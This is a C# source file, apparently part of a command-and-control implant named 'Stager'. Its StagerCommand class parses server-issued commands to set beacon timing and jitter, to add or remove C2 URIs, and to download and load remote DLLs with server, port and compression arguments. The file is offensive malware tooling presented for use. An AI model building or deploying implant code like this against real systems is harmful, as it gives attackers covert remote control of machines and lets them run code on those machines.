using System;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Net;

namespace Stager
{
    class StagerCommand
    {
        string fullCommandString;
        Command command;
        int beaconTime, jitter;
        HttpStatusCode httpStatusCode;
        Dictionary<string, string> arguments;
        /*
         * The uri could be a uri to load, remove, or location to download a dll. It depends on the command
         */
        List<Uri> uris;
        DateTime timestamp;

        public StagerCommand()
        {
            uris = new List<Uri>();
            arguments = new Dictionary<string, string>();
        }
        /// <summary>
        /// Gets/Sets the HttpStatusCode for the connection to the C2
        /// </summary>
        public HttpStatusCode HttpStatusCode
        {
            get
            {
                return httpStatusCode;
            }
            set
            {
                httpStatusCode = value;
            }
        }
        /// <summary>
        /// Gets the arguments of the command
        /// </summary>
        public Dictionary<string, string> Arguments
        {
            get
            {
                return arguments;
            }
        }
        /// <summary>
        /// Get or set the value for fullCommandString - an unparsed string received from the server
        /// If setting the command, then ParseCommandString is called.
        /// </summary>
        public string FullCommandString
        {
            get
            {
                return fullCommandString;
            }
            set
            {
                fullCommandString = value;
                ParseCommandString(value);
            }
        }
        /// <summary>
        /// Get the command received from the server
        /// </summary>
        public Command Command
        {
            get
            {
                return command;
            }
        }
        /// <summary>
        /// Get or set the value for beaconTime
        /// </summary>
        public int BeaconTime
        {
            get
            {
                return beaconTime;
            }
            set
            {
                if (value < 1)
                    throw new ArgumentOutOfRangeException($"{nameof(value)} must be greater than 0.");
                beaconTime = value;
            }
        }
        /// <summary>
        /// Get or set the value for jitter
        /// </summary>
        public int Jitter
        {
            get
            {
                return jitter;
            }
            set
            {
                if(value < 0)
                    throw new ArgumentOutOfRangeException($"{nameof(value)} must be greater than -1.");
                jitter = value;
            }
        }
        /// <summary>
        /// Get or set the received uri
        /// </summary>
        public List<Uri> Uris
        {
            get
            {
                return uris;
            }
            set
            {
                uris = value;
            }
        }
        /// <summary>
        /// Get the value for timestamp - the creation time of the StagerResult
        /// </summary>
        public DateTime Timestamp
        {
            get
            {
                return timestamp;
            }
            set
            {
                timestamp = value;
            }
        }
        /// <summary>
        /// Parses the command string
        /// </summary>
        private void ParseCommandString(string c)
        {
            string[] splitCommandString = c.Split(",".ToCharArray()); // Make it all lower case no matter what
            Regex r = new Regex(@"beacon|load|add|remove", RegexOptions.IgnoreCase);
            if (r.IsMatch(splitCommandString[0]))
            {
#if DEBUG
                Console.WriteLine("[*] Found command {0}", splitCommandString[0]);
#endif
                splitCommandString[0] = splitCommandString[0].ToLower();
                switch (splitCommandString[0])
                {
                    case "beacon":
                        command = Command.Beacon;
                        foreach(string s in splitCommandString)
                        {
                            if(s.Contains("jitter") || s.Contains("seconds"))
                            {
                                string[] tmp = s.Split("=".ToCharArray());
                                arguments[tmp[0]] = tmp[1];
                            }
                        }
                        break;
                    case "load":
                        command = Command.Load;
                        uris.Add(new Uri(splitCommandString[1]));
                        // Parse the arguments of the command
                        foreach(string s in splitCommandString)
                        {
                            if (s.Contains("server") || s.Contains("port") || s.Contains("compression"))
                            {
                                string[] tmp = s.Split("=".ToCharArray());
                                arguments[tmp[0]] = tmp[1];
                            }

                        }
#if DEBUG
                        foreach (KeyValuePair<string, string> kv in arguments)
                        {
                            Console.WriteLine("Key: {0} Value: {1}", kv.Key, kv.Value);
                        }
#endif
                        break;
                    case "add":
                        command = Command.Add;
                        string[] tmpAddUris = splitCommandString[1].Split("&".ToCharArray());
                        foreach(string u in tmpAddUris)
                        {
                            Uri tmp = new Uri(u);
                            uris.Add(tmp);
                        }
                        break;
                    case "remove":
                        command = Command.Remove;
                        string[] tmpRemoveUris = splitCommandString[1].Split("&".ToCharArray());
                        foreach (string u in tmpRemoveUris)
                        {
                            Uri tmp = new Uri(u);
                            uris.Add(tmp);
                        }
                        break;
                }
            }
        }
    }
}
